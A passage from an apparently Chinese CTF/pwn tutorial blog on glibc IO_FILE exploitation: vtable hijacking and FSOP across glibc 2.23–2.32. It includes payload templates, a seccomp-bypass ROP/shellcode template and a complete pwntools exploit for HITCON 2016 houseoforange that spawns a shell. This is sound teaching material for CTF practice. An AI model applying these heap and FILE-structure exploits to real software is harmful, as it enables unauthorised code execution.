class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</strong></p>
<p><strong>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</strong></p>
<p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable  是可以写入并且不存在其他检测的。</p>
<h1 id="FSOP-2-23版本"><a href="#FSOP-2-23版本" class="headerlink" title="FSOP(2.23版本)"></a>FSOP(2.23版本)</h1><p>个人理解就是，通过unsorted bin attack 向_IO_list_all里面写入一个地址，通常是main_arena+96，而该地址好像是small bin[4]的头；然后我们通过堆溢出或则其它的手段，构造一个假的_IO_FILE，并且把它的vtable改写为我们能够任意写的地址，然后把_IO_overflow改为system或者onegadget；如果改为system，就需要在假的_IO_FILE结构的flag填充为/bin/sh，因为调用vtable的时候，会将它的<code>_IO_FILE_plus</code>地址当作第一个参数传递</p>
<blockquote>
<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
</blockquote>
<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
<ol>
<li>当 libc 执行 abort 流程时</li>
<li>当执行 exit 函数时</li>
<li>当执行流从 main 函数返回时</li>
</ol>
<p><strong>当 glibc 检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt;</strong></p>
<p><strong>libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</strong></p>
<p>利用条件</p>
<p>伪造 fp-&gt;_mode = 0， fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base通过验证</p>
<h3 id="利用模板"><a href="#利用模板" class="headerlink" title="利用模板"></a>利用模板</h3><h4 id="x64位"><a href="#x64位" class="headerlink" title="x64位"></a>x64位</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">stream += p64(<span class="number">0xDEADBEEF</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">stream +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">stream = stream.ljust(<span class="number">0xc0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>) <span class="comment"># mode&lt;=0</span></span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(vtable_addr)</span><br></pre></td></tr></table></figure>

<h4 id="x32位"><a href="#x32位" class="headerlink" title="x32位"></a>x32位</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="string">&quot;sh\x00\x00&quot;</span>+p32(<span class="number">0x31</span>)   <span class="comment"># system_call_parameter and link to small_bin[4]</span></span><br><span class="line">stream += <span class="string">&quot;;$0\x00&quot;</span>+p32(IO_list_all-<span class="number">0x8</span>)   <span class="comment"># Unsorted_bin attack</span></span><br><span class="line">stream +=p32(<span class="number">1</span>)+p32(<span class="number">2</span>)     <span class="comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">stream = stream.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">stream += p32(<span class="number">0</span>)    <span class="comment"># mode&lt;=0</span></span><br><span class="line">stream += p32(<span class="number">0</span>)</span><br><span class="line">stream += p32(<span class="number">0</span>)</span><br><span class="line">stream += p32(vtable_addr)  <span class="comment"># vtable_addr --&gt; system</span></span><br></pre></td></tr></table></figure>

<h4 id="64位下seccomp禁用execve系统调用的构造模板"><a href="#64位下seccomp禁用execve系统调用的构造模板" class="headerlink" title="64位下seccomp禁用execve系统调用的构造模板"></a>64位下seccomp禁用execve系统调用的构造模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext = libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">mprotect = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">Open = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">Read = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">Write = libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400d93</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base+<span class="number">0x0000000000020256</span></span><br><span class="line">pop_three_ret = <span class="number">0x0000000000400d8f</span></span><br><span class="line">ret = <span class="number">0x00000000004008d9</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    p64(pop_rdi_ret),</span><br><span class="line">    p64(current_io_chunk&amp;~<span class="number">0xfff</span>),</span><br><span class="line">    p64(pop_rsi_ret),</span><br><span class="line">    p64(<span class="number">0x1000</span>),</span><br><span class="line">    p64(pop_rdx_ret),</span><br><span class="line">    p64(<span class="number">7</span>),</span><br><span class="line">    p64(mprotect),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">rop += p64(current_io_chunk+<span class="number">0x30</span>+<span class="built_in">len</span>(rop)+<span class="number">8</span>)+shellcode</span><br><span class="line"></span><br><span class="line">fake_vtable = current_io_chunk+<span class="number">0xe0</span>-<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0xddaa</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += rop</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(current_io_chunk+<span class="number">0x30</span>) <span class="comment">#rsp</span></span><br><span class="line">payload += p64(ret) <span class="comment"># to rop</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">payload += p64(setcontext+<span class="number">53</span>) <span class="comment"># 0xe0</span></span><br></pre></td></tr></table></figure>

<h4 id="例题：houseoforange-hitcon-2016"><a href="#例题：houseoforange-hitcon-2016" class="headerlink" title="例题：houseoforange-hitcon-2016"></a>例题：houseoforange-hitcon-2016</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,29277)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/lol/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">offset = libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">length,name,price</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">length,name,price</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>,<span class="number">32</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x22</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x0f41</span>)</span><br><span class="line"><span class="comment">#print (hex(len(payload)))</span></span><br><span class="line">upgrade(<span class="built_in">len</span>(payload),payload,<span class="number">0xa0</span>)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">100</span>,<span class="number">88</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;\x78&#x27;</span>,<span class="number">88</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">88</span>-offset-<span class="number">0x600</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">one_gadget=base +one_gadget[<span class="number">0</span>]</span><br><span class="line">io_list_all = base +libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vtable = base+libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xd8</span></span><br><span class="line"><span class="comment">#print (hex(vtable))</span></span><br><span class="line"><span class="comment">#print (hex(io_list_all))</span></span><br><span class="line">payload1 =<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x78&#x27;</span></span><br><span class="line">upgrade(<span class="number">0x11</span>,payload1,<span class="number">88</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span></span><br><span class="line">heap_base = heap-<span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(heap_base))</span><br><span class="line">payload2 =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0x58</span>)+p32(<span class="number">0x22</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file +=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x630</span>) </span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(sys)</span><br><span class="line">payload2 += fake_file</span><br><span class="line">upgrade(<span class="built_in">len</span>(payload2), payload2, <span class="number">88</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="FSOP-2-24版本"><a href="#FSOP-2-24版本" class="headerlink" title="FSOP(2.24版本)"></a>FSOP(2.24版本)</h1><p>个人理解就是，vtable不能随便改为我们的任意写地址，需要改为在<strong>stop_IO_vtables</strong> 和 <strong>start_libc_IO_vtables</strong> 之间；满足这个条件的有<strong>IO_str_jumps</strong>与**__IO_wstr_jumps**；所以在2.24版本中，我们需要将假_IO_FILE的vtable地址改为str_jumps或者wstr_jumps。</p>
<blockquote>
<p>libc2.24对vtable做了一些限制约束，对 vtable 进行校验的函数是 <code>IO_validate_vtable</code>：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vtable必须要满足 在 <strong>stop_IO_vtables</strong> 和 <strong>start_libc_IO_vtables</strong> 之间，而我们伪造的vtable通常不满足这个条件。<br>但是_<strong>IO_str_jumps</strong> 与__IO_wstr_jumps就位于 __stop___libc_IO_vtables 和 __start___libc_IO_vtables 之间, 所以我们是可以利用他们来通过 IO_validate_vtable 的检测的,只需要将vtable填成_IO_str_jumps 或__IO_wstr_jumps就行。有两种利用方式如下：</p>
<ul>
<li>利用__IO_str_jumps中的_IO_str_finsh函数</li>
<li>利用__IO_str_jumps中的_IO_str_overflow函数</li>
</ul>
<p>IO_str_jumps结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),    #这个函数会调用FILE+<span class="number">0xe0</span>处的地址</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中 IO_str_overflow 函数会调用 FILE+0xe0处的地址。这时只要我们将虚表覆盖为 IO_str_jumps将偏移0xe0处设置为one_gadget即可。</p>
<p>还有一种就是利用io_finish函数，同上面的类似， io_finish会以 IO_buf_base处的值为参数跳转至  FILE+0xe8处的地址。执行 fclose（ fp）时会调用此函数，但是大多数情况下可能不会有  fclose（fp），这时我们还是可以利用异常来调用 io_finish，异常时调用 IO_OVERFLOW</p>
<p>是根据IO_str_overflow在虚表中的偏移找到的， 我们可以设置vtable为IO_str_jumps-0x8异常时会调用io_finish函数。</p>
<h2 id="2-23-2-24总结利用"><a href="#2-23-2-24总结利用" class="headerlink" title="2.23-2.24总结利用"></a>2.23-2.24总结利用</h2><p>共同点，都需要通过调用 _IO_flush_all_lockp()函数来触发，有三种情况。</p>
<ol>
<li>当 libc 执行 abort 流程时。</li>
<li>当执行流从 main 函数返回时</li>
<li>当执行 exit 函数时。</li>
<li>当 glibc 检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt;libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</li>
</ol>
<ul>
<li>2.23版本下FSOP，个人理解就是，通过unsorted bin attack 向_IO_list_all里面写入一个地址，通常是main_arena+96，而该地址好像是small bin[4]的头；然后我们通过堆溢出或则其它的手段，构造一个假的_IO_FILE，并且把它的vtable改写为我们能够任意写的地址，然后把_IO_overflow改为system或者onegadget；如果改为system，就需要在假的_IO_FILE结构的flag填充为/bin/sh，因为调用vtable的时候，会将它的<code>_IO_FILE_plus</code>地址当作第一个参数传递。</li>
<li>2.24版本以上2.31以下，个人理解就是，vtable不能随便改为我们的任意写地址，需要改为在<strong>stop_IO_vtables</strong> 和 <strong>start_libc_IO_vtables</strong> 之间；满足这个条件的有<strong>IO_str_jumps</strong>与**__IO_wstr_jumps**；所以在2.24版本中，我们需要将假_IO_FILE的vtable地址改为str_jumps或者wstr_jumps。利用条件，同上面一样，但是需要注意vtable地址的指向，以及注意将FILE+0xe0处的地址改为onegadget。原因是IO_str_overflow函数会调用FILE+0xe0的地址。</li>
</ul>
<h1 id="2-31版本下的IO-FILE利用"><a href="#2-31版本下的IO-FILE利用" class="headerlink" title="2.31版本下的IO_FILE利用"></a>2.31版本下的IO_FILE利用</h1><blockquote>
</blockquote>
<h3 id="2-32下的io-str-overflow"><a href="#2-32下的io-str-overflow" class="headerlink" title="2.32下的io_str_overflow"></a>2.32下的io_str_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  